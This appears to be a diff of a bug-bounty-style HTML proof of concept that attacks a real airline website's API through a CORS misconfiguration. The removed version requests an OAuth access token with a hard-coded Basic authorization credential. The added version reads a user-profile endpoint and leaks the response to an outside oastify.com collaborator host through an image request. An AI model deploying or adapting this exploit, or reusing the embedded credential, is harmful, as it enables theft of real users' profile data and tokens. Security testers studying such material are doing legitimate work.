@@ -1,29 +1,20 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CORS Payload</title>
-    <script>
-        // Crafted payload to trigger CORS
-        function sendRequest() {
-            var xhr = new XMLHttpRequest();
-            xhr.onreadystatechange = function() {
-                if (xhr.readyState === XMLHttpRequest.DONE) {
-                    if (xhr.status === 200) {
-                        console.log(xhr.responseText); // Log the response containing the access_token
-                    }
-                }
-            };
-            xhr.open('POST', 'https://www.aeromexico.com/api/oauth2/token?grant_type=client_credentials');
-            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-            xhr.setRequestHeader('Authorization', 'Basic N21rbmdqdm83YTlwOHRwNTRxZjBlczdmYWg6dGQwdjc4YnR2OWplbXRkdGdhbzVoa2JnMzBvYWQ4aWw3bmg4Zjg4YWdsbzZkdm84cXJw');
-            xhr.withCredentials = true;
-            xhr.send();
-        }
-    </script>
+    <title>CORS Test</title>
 </head>
 <body>
-    <button onclick="sendRequest()">Send CORS Request</button>
+    <script type="text/javascript">
+        var xhr = new XMLHttpRequest();
+        xhr.open('GET', 'http://aeromexico.com/api/v4/profile/user-profile', true);
+        xhr.setRequestHeader('Origin', 'http://<your-collaborator-id>.burpcollaborator.net');
+        xhr.onreadystatechange = function() {
+            if (xhr.readyState == 4 && xhr.status == 200) {
+                var img = new Image();
+                img.src = 'http://gyipja1lt51redrzk38ulumbk2qtenhb6.oastify.com/log?data=' + encodeURIComponent(xhr.responseText);
+            }
+        };
+        xhr.send();
+    </script>
 </body>
 </html>
